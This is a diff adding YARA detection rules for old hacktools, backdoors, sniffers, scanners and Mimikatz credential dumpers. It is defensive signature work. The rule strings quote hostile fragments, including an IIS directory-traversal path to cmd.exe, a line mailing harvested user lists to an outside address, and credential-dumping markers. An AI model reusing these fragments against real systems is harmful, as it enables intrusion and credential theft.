+		score = 60
+		hash = "41d57d356098ff55fe0e1f0bcaa9317df5a2a45c"
+	strings:
+		$s0 = "made to port 80 of the remote machine at 192.168.1.101 with the" fullword ascii
+		$s1 = "Unable to resolve hostname \"%s\"" fullword ascii
+		$s2 = "source port for that outbound connection being set to 53 also." fullword ascii
+		$s3 = " -s    - outbound source port number" fullword ascii
+		$s5 = "http://www.foundstone.com" fullword ascii
+		$s20 = "Attempting to connect to %s port %d" fullword ascii
+	condition:
+		all of them
+}
+
+rule sig_238_concon {
+	meta:
+		description = "Disclosed hacktool set (old stuff) - file concon.com"
+		author = "Florian Roth"
+		date = "23.11.14"
+		score = 60
+		hash = "816b69eae66ba2dfe08a37fff077e79d02b95cc1"
+	strings:
+		$s0 = "Usage: concon \\\\ip\\sharename\\con\\con" fullword ascii
+	condition:
+		all of them
+}
+
+rule aspbackdoor_regdll {
+	meta:
+		description = "Disclosed hacktool set (old stuff) - file regdll.asp"
+		author = "Florian Roth"
+		date = "23.11.14"
+		score = 60
+		hash = "5c5e16a00bcb1437bfe519b707e0f5c5f63a488d"
+	strings:
+		$s1 = "exitcode = oShell.Run(\"c:\\WINNT\\system32\\regsvr32.exe /u/s \" & strFile, 0, " ascii
+		$s3 = "oShell.Run \"c:\\WINNT\\system32\\regsvr32.exe /u/s \" & strFile, 0, False" fullword ascii
+		$s4 = "EchoB(\"regsvr32.exe exitcode = \" & exitcode)" fullword ascii
+		$s5 = "Public Property Get oFS()" fullword ascii
+	condition:
+		all of them
+}
+
+rule CleanIISLog {
+	meta:
+		description = "Disclosed hacktool set (old stuff) - file CleanIISLog.exe"
+		author = "Florian Roth"
+		date = "23.11.14"
+		score = 60
+		hash = "827cd898bfe8aa7e9aaefbe949d26298f9e24094"
+	strings:
+		$s1 = "CleanIP - Specify IP Address Which You Want Clear." fullword ascii
+		$s2 = "LogFile - Specify Log File Which You Want Process." fullword ascii
+		$s8 = "CleanIISLog Ver" fullword ascii
+		$s9 = "msftpsvc" fullword ascii
+		$s10 = "Fatal Error: MFC initialization failed" fullword ascii
+		$s11 = "Specified \"ALL\" Will Process All Log Files." fullword ascii
+		$s12 = "Specified \".\" Will Clean All IP Record." fullword ascii
+		$s16 = "Service %s Stopped." fullword ascii
+		$s20 = "Process Log File %s..." fullword ascii
+	condition:
+		5 of them
+}
+
+rule sqlcheck {
+	meta:
+		description = "Disclosed hacktool set (old stuff) - file sqlcheck.exe"
+		author = "Florian Roth"
+		date = "23.11.14"
+		score = 60
+		hash = "5a5778ac200078b627db84fdc35bf5bcee232dc7"
+	strings:
+		$s0 = "Power by eyas<cooleyas@21cn.com>" fullword ascii
+		$s3 = "\\ipc$ \"\" /user:\"\"" fullword ascii
+		$s4 = "SQLCheck can only scan a class B network. Try again." fullword ascii
+		$s14 = "Example: SQLCheck 192.168.0.1 192.168.0.254" fullword ascii
+		$s20 = "Usage: SQLCheck <StartIP> <EndIP>" fullword ascii
+	condition:
+		3 of them
+}
+
+rule sig_238_RunAsEx {
+	meta:
+		description = "Disclosed hacktool set (old stuff) - file RunAsEx.exe"
+		author = "Florian Roth"
+		date = "23.11.14"
+		score = 60
+		hash = "a22fa4e38d4bf82041d67b4ac5a6c655b2e98d35"
+	strings:
+		$s0 = "RunAsEx By Assassin 2000. All Rights Reserved. http://www.netXeyes.com" fullword ascii
+		$s8 = "cmd.bat" fullword ascii
+		$s9 = "Note: This Program Can'nt Run With Local Machine." fullword ascii
+		$s11 = "%s Execute Succussifully." fullword ascii
+		$s12 = "winsta0" fullword ascii
+		$s15 = "Usage: RunAsEx <UserName> <Password> <Execute File> [\"Execute Option\"]" fullword ascii
+	condition:
+		4 of them
+}
+
+rule sig_238_nbtdump {
+	meta:
+		description = "Disclosed hacktool set (old stuff) - file nbtdump.exe"
+		author = "Florian Roth"
+		date = "23.11.14"
+		score = 60
+		hash = "cfe82aad5fc4d79cf3f551b9b12eaf9889ebafd8"
+	strings:
+		$s0 = "Creation of results file - \"%s\" failed." fullword ascii
+		$s1 = "c:\\>nbtdump remote-machine" fullword ascii
+		$s7 = "Cerberus NBTDUMP" fullword ascii
+		$s11 = "<CENTER><H1>Cerberus Internet Scanner</H1>" fullword ascii
+		$s18 = "<P><H3>Account Information</H3><PRE>" fullword wide
+		$s19 = "%s's password is %s</H3>" fullword wide
+		$s20 = "%s's password is blank</H3>" fullword wide
+	condition:
+		5 of them
+}
+
+rule sig_238_Glass2k {
+	meta:
+		description = "Disclosed hacktool set (old stuff) - file Glass2k.exe"
+		author = "Florian Roth"
+		date = "23.11.14"
+		score = 60
+		hash = "b05455a1ecc6bc7fc8ddef312a670f2013704f1a"
+	strings:
+		$s0 = "Portions Copyright (c) 1997-1999 Lee Hasiuk" fullword ascii
+		$s1 = "C:\\Program Files\\Microsoft Visual Studio\\VB98" fullword ascii
+		$s3 = "WINNT\\System32\\stdole2.tlb" fullword ascii
+		$s4 = "Glass2k.exe" fullword wide
+		$s7 = "NeoLite Executable File Compressor" fullword ascii
+	condition:
+		all of them
+}
+
+rule SplitJoin_V1_3_3_rar_Folder_3 {
+	meta:
+		description = "Disclosed hacktool set (old stuff) - file splitjoin.exe"
+		author = "Florian Roth"
+		date = "23.11.14"
+		score = 60
+		hash = "21409117b536664a913dcd159d6f4d8758f43435"
+	strings:
+		$s2 = "ie686@sohu.com" fullword ascii
+		$s3 = "splitjoin.exe" fullword ascii
+		$s7 = "SplitJoin" fullword ascii
+	condition:
+		all of them
+}
+
+rule aspbackdoor_EDIT {
+	meta:
+		description = "Disclosed hacktool set (old stuff) - file EDIT.ASP"
+		author = "Florian Roth"
+		date = "23.11.14"
+		score = 60
+		hash = "12196cf62931cde7b6cb979c07bb5cc6a7535cbb"
+	strings:
+		$s1 = "<meta HTTP-EQUIV=\"Content-Type\" CONTENT=\"text/html;charset=gb_2312-80\">" fullword ascii
+		$s2 = "Set thisfile = fs.GetFile(whichfile)" fullword ascii
+		$s3 = "response.write \"<a href='index.asp'>" fullword ascii
+		$s5 = "if Request.Cookies(\"password\")=\"juchen\" then " fullword ascii
+		$s6 = "Set thisfile = fs.OpenTextFile(whichfile, 1, False)" fullword ascii
+		$s7 = "color: rgb(255,0,0); text-decoration: underline }" fullword ascii
+		$s13 = "if Request(\"creat\")<>\"yes\" then" fullword ascii
+	condition:
+		5 of them
+}
+
+rule aspbackdoor_entice {
+	meta:
+		description = "Disclosed hacktool set (old stuff) - file entice.asp"
+		author = "Florian Roth"
+		date = "23.11.14"
+		score = 60
+		hash = "e273a1b9ef4a00ae4a5d435c3c9c99ee887cb183"
+	strings:
+		$s0 = "<Form Name=\"FormPst\" Method=\"Post\" Action=\"entice.asp\">" fullword ascii
+		$s2 = "if left(trim(request(\"sqllanguage\")),6)=\"select\" then" fullword ascii
+		$s4 = "conndb.Execute(sqllanguage)" fullword ascii
+		$s5 = "<!--#include file=sqlconn.asp-->" fullword ascii
+		$s6 = "rstsql=\"select * from \"&rstable(\"table_name\")" fullword ascii
+	condition:
+		all of them
+}
+
+rule FPipe2_0 {
+	meta:
+		description = "Disclosed hacktool set (old stuff) - file FPipe2.0.exe"
+		author = "Florian Roth"
+		date = "23.11.14"
+		score = 60
+		hash = "891609db7a6787575641154e7aab7757e74d837b"
+	strings:
+		$s0 = "made to port 80 of the remote machine at 192.168.1.101 with the" fullword ascii
+		$s1 = "Unable to resolve hostname \"%s\"" fullword ascii
+		$s2 = " -s    - outbound connection source port number" fullword ascii
+		$s3 = "source port for that outbound connection being set to 53 also." fullword ascii
+		$s4 = "http://www.foundstone.com" fullword ascii
+		$s19 = "FPipe" fullword ascii
+	condition:
+		all of them
+}
+
+rule InstGina {
+	meta:
+		description = "Disclosed hacktool set (old stuff) - file InstGina.exe"
+		author = "Florian Roth"
+		date = "23.11.14"
+		score = 60
+		hash = "5317fbc39508708534246ef4241e78da41a4f31c"
+	strings:
+		$s0 = "To Open Registry" fullword ascii
+		$s4 = "I love Candy very much!!" ascii
+		$s5 = "GinaDLL" fullword ascii
+	condition:
+		all of them
+}
+
+rule ArtTray_zip_Folder_ArtTray {
+	meta:
+		description = "Disclosed hacktool set (old stuff) - file ArtTray.exe"
+		author = "Florian Roth"
+		date = "23.11.14"
+		score = 60
+		hash = "ee1edc8c4458c71573b5f555d32043cbc600a120"
+	strings:
+		$s0 = "http://www.brigsoft.com" fullword wide
+		$s2 = "ArtTrayHookDll.dll" fullword ascii
+		$s3 = "ArtTray Version 1.0 " fullword wide
+		$s16 = "TRM_HOOKCALLBACK" fullword ascii
+	condition:
+		all of them
+}
+
+rule sig_238_findoor {
+	meta:
+		description = "Disclosed hacktool set (old stuff) - file findoor.exe"
+		author = "Florian Roth"
+		date = "23.11.14"
+		score = 60
+		hash = "cdb1ececceade0ecdd4479ecf55b0cc1cf11cdce"
+	strings:
+		$s0 = "(non-Win32 .EXE or error in .EXE image)." fullword ascii
+		$s8 = "PASS hacker@hacker.com" fullword ascii
+		$s9 = "/scripts/..%c1%1c../winnt/system32/cmd.exe" fullword ascii
+		$s10 = "MAIL FROM:hacker@hacker.com" fullword ascii
+		$s11 = "http://isno.yeah.net" fullword ascii
+	condition:
+		4 of them
+}
+
+rule aspbackdoor_ipclear {
+	meta:
+		description = "Disclosed hacktool set (old stuff) - file ipclear.vbs"
+		author = "Florian Roth"
+		date = "23.11.14"
+		score = 60
+		hash = "9f8fdfde4b729516330eaeb9141fb2a7ff7d0098"
+	strings:
+		$s0 = "Set ServiceObj = GetObject(\"WinNT://\" & objNet.ComputerName & \"/w3svc\")" fullword ascii
+		$s1 = "wscript.Echo \"USAGE:KillLog.vbs LogFileName YourIP.\"" fullword ascii
+		$s2 = "Set txtStreamOut = fso.OpenTextFile(destfile, ForWriting, True)" fullword ascii
+		$s3 = "Set objNet = WScript.CreateObject( \"WScript.Network\" )" fullword ascii
+		$s4 = "Set fso = CreateObject(\"Scripting.FileSystemObject\")" fullword ascii
+	condition:
+		all of them
+}
+
+rule WinEggDropShellFinal_zip_Folder_InjectT {
+	meta:
+		description = "Disclosed hacktool set (old stuff) - file InjectT.exe"
+		author = "Florian Roth"
+		date = "23.11.14"
+		score = 60
+		hash = "516e80e4a25660954de8c12313e2d7642bdb79dd"
+	strings:
+		$s0 = "Packed by exe32pack" ascii
+		$s1 = "2TInject.Dll" fullword ascii
+		$s2 = "Windows Services" fullword ascii
+		$s3 = "Findrst6" fullword ascii
+		$s4 = "Press Any Key To Continue......" fullword ascii
+	condition:
+		all of them
+}
+
+rule sig_238_rshsvc {
+	meta:
+		description = "Disclosed hacktool set (old stuff) - file rshsvc.bat"
+		author = "Florian Roth"
+		date = "23.11.14"
+		score = 60
+		hash = "fb15c31254a21412aecff6a6c4c19304eb5e7d75"
+	strings:
+		$s0 = "if not exist %1\\rshsetup.exe goto ERROR2" fullword ascii
+		$s1 = "ECHO rshsetup.exe is not found in the %1 directory" fullword ascii
+		$s9 = "REM %1 directory must have rshsetup.exe,rshsvc.exe and rshsvc.dll" fullword ascii
+		$s10 = "copy %1\\rshsvc.exe" fullword ascii
+		$s12 = "ECHO Use \"net start rshsvc\" to start the service." fullword ascii
+		$s13 = "rshsetup %SystemRoot%\\system32\\rshsvc.exe %SystemRoot%\\system32\\rshsvc.dll" fullword ascii
+		$s18 = "pushd %SystemRoot%\\system32" fullword ascii
+	condition:
+		all of them
+}
+
+rule gina_zip_Folder_gina {
+	meta:
+		description = "Disclosed hacktool set (old stuff) - file gina.dll"
+		author = "Florian Roth"
+		date = "23.11.14"
+		score = 60
+		hash = "e0429e1b59989cbab6646ba905ac312710f5ed30"
+	strings:
+		$s0 = "NEWGINA.dll" fullword ascii
+		$s1 = "LOADER ERROR" fullword ascii
+		$s3 = "WlxActivateUserShell" fullword ascii
+		$s6 = "WlxWkstaLockedSAS" fullword ascii
+		$s13 = "WlxIsLockOk" fullword ascii
+		$s14 = "The procedure entry point %s could not be located in the dynamic link library %s" fullword ascii
+		$s16 = "WlxShutdown" fullword ascii
+		$s17 = "The ordinal %u could not be located in the dynamic link library %s" fullword ascii
+	condition:
+		all of them
+}
+
+rule superscan3_0 {
+	meta:
+		description = "Disclosed hacktool set (old stuff) - file superscan3.0.exe"
+		author = "Florian Roth"
+		date = "23.11.14"
+		score = 60
+		hash = "a9a02a14ea4e78af30b8b4a7e1c6ed500a36bc4d"
+	strings:
+		$s0 = "\\scanner.ini" fullword ascii
+		$s1 = "\\scanner.exe" fullword ascii
+		$s2 = "\\scanner.lst" fullword ascii
+		$s4 = "\\hensss.lst" fullword ascii
+		$s5 = "STUB32.EXE" fullword wide
+		$s6 = "STUB.EXE" fullword wide
+		$s8 = "\\ws2check.exe" fullword ascii
+		$s9 = "\\trojans.lst" fullword ascii
+		$s10 = "1996 InstallShield Software Corporation" fullword wide
+	condition:
+		all of them
+}
+
+rule sig_238_xsniff {
+	meta:
+		description = "Disclosed hacktool set (old stuff) - file xsniff.exe"
+		author = "Florian Roth"
+		date = "23.11.14"
+		score = 60
+		hash = "d61d7329ac74f66245a92c4505a327c85875c577"
+	strings:
+		$s2 = "xsiff.exe -pass -hide -log pass.log" fullword ascii
+		$s3 = "%s - simple sniffer for win2000" fullword ascii
+		$s4 = "xsiff.exe -tcp -udp -asc -addr 192.168.1.1" fullword ascii
+		$s5 = "HOST: %s USER: %s, PASS: %s" fullword ascii
+		$s7 = "http://www.xfocus.org" fullword ascii
+		$s9 = "  -pass        : Filter username/password" fullword ascii
+		$s18 = "  -udp         : Output udp packets" fullword ascii
+		$s19 = "Code by glacier <glacier@xfocus.org>" fullword ascii
+		$s20 = "  -tcp         : Output tcp packets" fullword ascii
+	condition:
+		6 of them
+}
+
+rule sig_238_fscan {
+	meta:
+		description = "Disclosed hacktool set (old stuff) - file fscan.exe"
+		author = "Florian Roth"
+		date = "23.11.14"
+		score = 60
+		hash = "d5646e86b5257f9c83ea23eca3d86de336224e55"
+	strings:
+		$s0 = "FScan v1.12 - Command line port scanner." fullword ascii
+		$s2 = " -n    - no port scanning - only pinging (unless you use -q)" fullword ascii
+		$s5 = "Example: fscan -bp 80,100-200,443 10.0.0.1-10.0.1.200" fullword ascii
+		$s6 = " -z    - maximum simultaneous threads to use for scanning" fullword ascii
+		$s12 = "Failed to open the IP list file \"%s\"" fullword ascii
+		$s13 = "http://www.foundstone.com" fullword ascii
+		$s16 = " -p    - TCP port(s) to scan (a comma separated list of ports/ranges) " fullword ascii
+		$s18 = "Bind port number out of range. Using system default." fullword ascii
+		$s19 = "fscan.exe" fullword wide
+	condition:
+		4 of them
+}
+
+rule _iissample_nesscan_twwwscan {
+	meta:
+		description = "Disclosed hacktool set (old stuff) - from files iissample.exe, nesscan.exe, twwwscan.exe"
+		author = "Florian Roth"
+		date = "23.11.14"
+		score = 60
+		super_rule = 1
+		hash0 = "7f20962bbc6890bf48ee81de85d7d76a8464b862"
+		hash1 = "c0b1a2196e82eea4ca8b8c25c57ec88e4478c25b"
+		hash2 = "548f0d71ef6ffcc00c0b44367ec4b3bb0671d92f"
+	strings:
+		$s0 = "Connecting HTTP Port - Result: " fullword
+		$s1 = "No space for command line argument vector" fullword
+		$s3 = "Microsoft(July/1999~) http://www.microsoft.com/technet/security/current.asp" fullword
+		$s5 = "No space for copy of command line" fullword
+		$s7 = "-  Windows NT,2000 Patch Method  - " fullword
+		$s8 = "scanf : floating point formats not linked" fullword
+		$s12 = "hrdir_b.c: LoadLibrary != mmdll borlndmm failed" fullword
+		$s13 = "!\"what?\"" fullword
+		$s14 = "%s Port %d Closed" fullword
+		$s16 = "printf : floating point formats not linked" fullword
+		$s17 = "xxtype.cpp" fullword
+	condition:
+		all of them
+}
+
+rule _FsHttp_FsPop_FsSniffer {
+	meta:
+		description = "Disclosed hacktool set (old stuff) - from files FsHttp.exe, FsPop.exe, FsSniffer.exe"
+		author = "Florian Roth"
+		date = "23.11.14"
+		score = 60
+		super_rule = 1
+		hash0 = "9d4e7611a328eb430a8bb6dc7832440713926f5f"
+		hash1 = "ae23522a3529d3313dd883727c341331a1fb1ab9"
+		hash2 = "7ffc496cd4a1017485dfb571329523a52c9032d8"
+	strings:
+		$s0 = "-ERR Invalid Command, Type [Help] For Command List" fullword
+		$s1 = "-ERR Get SMS Users ID Failed" fullword
+		$s2 = "Control Time Out 90 Secs, Connection Closed" fullword
+		$s3 = "-ERR Post SMS Failed" fullword
+		$s4 = "Current.hlt" fullword
+		$s6 = "Histroy.hlt" fullword
+		$s7 = "-ERR Send SMS Failed" fullword
+		$s12 = "-ERR Change Password <New Password>" fullword
+		$s17 = "+OK Send SMS Succussifully" fullword
+		$s18 = "+OK Set New Password: [%s]" fullword
+		$s19 = "CHANGE PASSWORD" fullword
+	condition:
+		all of them
+}
+
+rule Ammyy_Admin_AA_v3 {
+	meta:
+		description = "Remote Admin Tool used by APT group Anunak (ru) - file AA_v3.4.exe and AA_v3.5.exe"
+		author = "Florian Roth"
+		reference = "http://goo.gl/gkAg2E"
+		date = "2014/12/22"
+		score = 55
+		hash1 = "b130611c92788337c4f6bb9e9454ff06eb409166"
+		hash2 = "07539abb2623fe24b9a05e240f675fa2d15268cb"		
+	strings:
+		$x1 = "S:\\Ammyy\\sources\\target\\TrService.cpp" fullword ascii
+		$x2 = "S:\\Ammyy\\sources\\target\\TrDesktopCopyRect.cpp" fullword ascii
+		$x3 = "Global\\Ammyy.Target.IncomePort" fullword ascii
+		$x4 = "S:\\Ammyy\\sources\\target\\TrFmFileSys.cpp" fullword ascii
+		$x5 = "Please enter password for accessing remote computer" fullword ascii
+		
+		$s1 = "CreateProcess1()#3 %d error=%d" fullword ascii
+		$s2 = "CHttpClient::SendRequest2(%s, %s, %d) error: invalid host name." fullword ascii
+		$s3 = "ERROR: CreateProcessAsUser() error=%d, session=%d" fullword ascii
+		$s4 = "ERROR: FindProcessByName('explorer.exe')" fullword ascii
+	condition:
+		2 of ($x*) or all of ($s*)
+}
+
+/* Other dumper and custom hack tools */
+
+rule Mimikatz_Samples_2014b_1 {
+	meta:
+		description = "Mimikatz pwassword dumper samples from the second half of 2014"
+		author = "Florian Roth with the help of YarGen Rule Generator"
+		reference = "not set"
+		date = "2014/12/23"
+		score = 80
+		hash = "ef5bd09b2e5836b58a8b27c1fb3650621aaf6488"
+	strings:
+		$s1 = "Raw command (not implemented yet) : %s" fullword wide
+		$s3 = " ! ZwSetInformationProcess 0x%08x for %u/%-14S" fullword wide
+		$s6 = "PsSetCreateProcessNotifyRoutineEx" fullword wide
+		$s10 = "\\Device\\mimidrv" fullword wide
+		$s16 = "\\DosDevices\\mimidrv" fullword wide
+		$s17 = "All privileges for the access token from %u/%-14S" fullword wide
+		$s20 = "in (0x%p - %u) ; out (0x%p - %u)" fullword wide
+	condition:
+		all of them
+}
+
+rule Mimikatz_Samples_2014b_2 {
+	meta:
+		description = "Mimikatz pwassword dumper samples from the second half of 2014"
+		author = "Florian Roth with the help of YarGen Rule Generator"
+		reference = "not set"
+		date = "2014/12/23"
+		score = 80		
+		hash = "98033f5bbdd79b12a7804bad0698c91e6d5067ad"
+	strings:
+		$s0 = "0: kd> .process /r /p <EPROCESS address>" fullword ascii
+		$s4 = "%p - lsasrv!LogonSessionListCount" fullword ascii
+		$s7 = "%p - lsasrv!LogonSessionList" fullword ascii
+		$s12 = "livessp!LiveGlobalLogonSessionList" fullword ascii
+		$s13 = "UndefinedLogonType" fullword ascii
+		$s14 = "[ERROR] [CRYPTO] Acquire keys" fullword ascii
+		$s15 = "masterkey" fullword ascii
+		$s16 = "kerberos!KerbGlobalLogonSessionTable" fullword ascii
+		$s17 = "RemoteInteractive" fullword ascii
+		$s18 = "mimilib.dll" fullword wide
+		$s19 = "%p - lsasrv!InitializationVector" fullword ascii
+		$s20 = "lsasrv!LogonSessionListCount" fullword ascii
+	condition:
+		all of them
+}
+
+rule Mimikatz_Samples_2014b_Family_2 {
+	meta:
+		description = "Mimikatz pwassword dumper samples from the second half of 2014"
+		author = "Florian Roth with the help of YarGen Rule Generator"
+		date = "2014/12/23"
+		super_rule = 1
+		score = 80		
+		hash0 = "61001a32c5388e629dd0441a77974200057816ef"
+		hash1 = "46df272cecb541aebca3c863802c0d0a0dc5fcb4"
+		hash2 = "c3307bb70efa19fc5049dfd829d07ea52a65bb74"
+		hash3 = "29d9bfc4e4884bc7b2f3cd01960b727c17fb50cb"
+		hash4 = "ac1d1db32ca6e7af5625f0f6fbe210fe68002b5c"
+	strings:
+		$s0 = "ncryptprov.dll" fullword wide
+		$s1 = "CERT_SYSTEM_STORE_CURRENT_USER_GROUP_POLICY" fullword wide
+		$s2 = "logonPasswords" fullword wide
+		$s3 = "CERT_SYSTEM_STORE_LOCAL_MACHINE_ENTERPRISE" fullword wide
+		$s4 = "CERT_SYSTEM_STORE_LOCAL_MACHINE_GROUP_POLICY" fullword wide
+		$s5 = "inject" fullword wide
+		$s6 = "MS_DEF_RSA_SCHANNEL_PROV" fullword wide
+		$s7 = "MS_ENHANCED_PROV" fullword wide
+		$s8 = "MS_DEF_RSA_SIG_PROV" fullword wide
+		$s9 = "privilege" fullword wide
+		$s10 = "MS_ENH_RSA_AES_PROV" fullword wide
+		$s16 = "sekurlsa" fullword wide
+		$s17 = "answer" fullword wide
+		$s18 = "secrets" fullword wide
+		$s19 = "MS_DEF_DSS_PROV" fullword wide
+		$s20 = "MS_DEF_PROV" fullword wide
+	condition:
+		all of them
+}
+
+rule LinuxHacktool_eyes_screen {
+	meta:
+		description = "Linux hack tools - file screen"
+		author = "Florian Roth"
+		reference = "not set"
+		date = "2015/01/19"
+		hash = "a240a0118739e72ff89cefa2540bf0d7da8f8a6c"
+	strings:
+		$s0 = "or: %s -r [host.tty]" fullword ascii
+		$s1 = "%s: process: character, ^x, or (octal) \\032 expected." fullword ascii
+		$s2 = "Type \"screen [-d] -r [pid.]tty.host\" to resume one of them." fullword ascii
+		$s6 = "%s: at [identifier][%%|*|#] command [args]" fullword ascii
+		$s8 = "Slurped only %d characters (of %d) into buffer - try again" fullword ascii
+		$s11 = "command from %s: %s %s" fullword ascii
+		$s16 = "[ Passwords don't match - your armor crumbles away ]" fullword ascii
+		$s19 = "[ Passwords don't match - checking turned off ]" fullword ascii
+	condition:
+		all of them
+}
+
+rule LinuxHacktool_eyes_scanssh {
+	meta:
+		description = "Linux hack tools - file scanssh"
+		author = "Florian Roth"
+		reference = "not set"
+		date = "2015/01/19"
+		hash = "467398a6994e2c1a66a3d39859cde41f090623ad"
+	strings:
+		$s0 = "Connection closed by remote host" fullword ascii
+		$s1 = "Writing packet : error on socket (or connection closed): %s" fullword ascii
+		$s2 = "Remote connection closed by signal SIG%s %s" fullword ascii
+		$s4 = "Reading private key %s failed (bad passphrase ?)" fullword ascii
+		$s5 = "Server closed connection" fullword ascii
+		$s6 = "%s: line %d: list delimiter not followed by keyword" fullword ascii
+		$s8 = "checking for version `%s' in file %s required by file %s" fullword ascii
+		$s9 = "Remote host closed connection" fullword ascii
+		$s10 = "%s: line %d: bad command `%s'" fullword ascii
+		$s13 = "verifying that server is a known host : file %s not found" fullword ascii
+		$s14 = "%s: line %d: expected service, found `%s'" fullword ascii
+		$s15 = "%s: line %d: list delimiter not followed by domain" fullword ascii
+		$s17 = "Public key from server (%s) doesn't match user preference (%s)" fullword ascii
+	condition:
+		all of them
+}
+rule LinuxHacktool_eyes_scanner {
+	meta:
+		description = "Linux hack tools - file scanner"
+		author = "Florian Roth"
+		reference = "not set"
+		date = "2015/01/19"
+		hash = "5488698b7f9090f45096517e61768efd32299d5b"
+	strings:
+		$s0 = "%s: line %d: list delimiter not followed by keyword" fullword ascii
+		$s1 = "checking for version `%s' in file %s required by file %s" fullword ascii
+		$s3 = "%s: line %d: expected service, found `%s'" fullword ascii
+		$s4 = "truncated dump file; tried to read %d header bytes, only got %lu" fullword ascii
+		$s5 = "%s: line %d: list delimiter not followed by domain" fullword ascii
+		$s7 = "'protochain' not supported with radiotap headers" fullword ascii
+		$s8 = "%s(): unsuported injection type" fullword ascii
+		$s9 = "ELF load command address/offset not properly aligned" fullword ascii
+		$s10 = "@(#) $Header: /tcpdump/master/libpcap/gencode.c,v 1.221.2.27 2005/07/14 16:01:46" ascii
+		$s20 = "%s%s%s:%u: %s%sAssertion `%s' failed." fullword ascii
+	condition:
+		4 of them
+}
+rule LinuxHacktool_eyes_pscan2 {
+	meta:
+		description = "Linux hack tools - file pscan2"
+		author = "Florian Roth"
+		reference = "not set"
+		date = "2015/01/19"
+		hash = "56b476cba702a4423a2d805a412cae8ef4330905"
+	strings:
+		$s0 = "# pscan completed in %u seconds. (found %d ips)" fullword ascii
+		$s1 = "Usage: %s <b-block> <port> [c-block]" fullword ascii
+		$s3 = "%s.%d.* (total: %d) (%.1f%% done)" fullword ascii
+		$s8 = "Invalid IP." fullword ascii
+		$s9 = "# scanning: " fullword ascii
+		$s10 = "Unable to allocate socket." fullword ascii
+	condition:
+		2 of them
+}
+
+rule LinuxHacktool_eyes_a {
+	meta:
+		description = "Linux hack tools - file a"
+		author = "Florian Roth"
+		reference = "not set"
+		date = "2015/01/19"
+		hash = "458ada1e37b90569b0b36afebba5ade337ea8695"
+	strings:
+		$s0 = "cat trueusers.txt | mail -s \"eyes\" clubby@slucia.com" fullword ascii
+		$s1 = "mv scan.log bios.txt" fullword ascii
+		$s2 = "rm -rf bios.txt" fullword ascii
+		$s3 = "echo -e \"# by Eyes.\"" fullword ascii
+		$s4 = "././pscan2 $1 22" fullword ascii
+		$s10 = "echo \"#cautam...\"" fullword ascii
+	condition:
+		2 of them
+}
+
+rule LinuxHacktool_eyes_mass {
+	meta:
+		description = "Linux hack tools - file mass"
+		author = "Florian Roth"
+		reference = "not set"
+		date = "2015/01/19"
+		hash = "2054cb427daaca9e267b252307dad03830475f15"
+	strings:
+		$s0 = "cat trueusers.txt | mail -s \"eyes\" clubby@slucia.com" fullword ascii
+		$s1 = "echo -e \"${BLU}Private Scanner By Raphaello , DeMMoNN , tzepelush & DraC\\n\\r" ascii
+		$s3 = "killall -9 pscan2" fullword ascii
+		$s5 = "echo \"[*] ${DCYN}Gata esti h4x0r ;-)${RES}  [*]\"" fullword ascii
+		$s6 = "echo -e \"${DCYN}@#@#@#@#@#@#@#@#@#@#@#@#@#@#@#@#@#@#@#@#@#@#@#@#@#@#@#${RES}\"" fullword ascii
+	condition:
+		1 of them
+}
+
+rule LinuxHacktool_eyes_pscan2_2 {
+	meta:
+		description = "Linux hack tools - file pscan2.c"
+		author = "Florian Roth"
+		reference = "not set"
+		date = "2015/01/19"
+		hash = "eb024dfb441471af7520215807c34d105efa5fd8"
+	strings:
+		$s0 = "snprintf(outfile, sizeof(outfile) - 1, \"scan.log\", argv[1], argv[2]);" fullword ascii
+		$s2 = "printf(\"Usage: %s <b-block> <port> [c-block]\\n\", argv[0]);" fullword ascii
+		$s3 = "printf(\"\\n# pscan completed in %u seconds. (found %d ips)\\n\", (time(0) - sca" ascii
+		$s19 = "connlist[i].addr.sin_family = AF_INET;" fullword ascii
+		$s20 = "snprintf(last, sizeof(last) - 1, \"%s.%d.* (total: %d) (%.1f%% done)\"," fullword ascii
+	condition:
+		2 of them
+}
+
+rule CN_Portscan : APT
+{
+    meta:
+        description = "CN Port Scanner"
+        author = "Florian Roth"
+        release_date = "2013-11-29"
+        confidential = false
+		score = 70
+    strings:
+    	$s1 = "MZ"
+		$s2 = "TCP 12.12.12.12"
+    condition:
+        ($s1 at 0) and $s2
+}
+
+rule WMI_vbs : APT 
+{
+    meta:
+        description = "WMI Tool - APT"
+        author = "Florian Roth"
+        release_date = "2013-11-29"
+        confidential = false
+		score = 70
+    strings:
+		$s3 = "WScript.Echo \"   $$\\      $$\\ $$\\      $$\\ $$$$$$\\ $$$$$$$$\\ $$\\   $$\\ $$$$$$$$\\  $$$$$$"  
+    condition:
+        all of them	
+}
+
